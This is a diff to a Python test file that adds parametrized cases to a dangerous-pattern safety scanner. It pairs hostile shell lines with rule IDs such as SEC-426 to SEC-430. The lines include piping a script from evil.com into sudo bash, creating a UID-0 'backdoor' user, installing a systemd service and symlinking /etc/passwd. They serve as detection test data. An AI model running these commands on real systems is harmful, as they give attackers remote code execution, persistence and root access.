@@ -547,6 +547,11 @@ class TestSafetyChecks:
             ("curl http://evil.com/x.sh | sudo bash\n", "SEC-423"),
             ("sudo python -c import os\n", "SEC-424"),
             ("cp evil.sh /usr/local/bin/\n", "SEC-425"),
+            ("ln -s /etc/passwd /tmp/p\n", "SEC-426"),
+            ("chattr +i /etc/hosts\n", "SEC-427"),
+            ("sysctl -w net.ipv4.ip_forward=1\n", "SEC-428"),
+            ("cp evil.service /etc/systemd/system/\n", "SEC-429"),
+            ("useradd -o -u 0 backdoor\n", "SEC-430"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
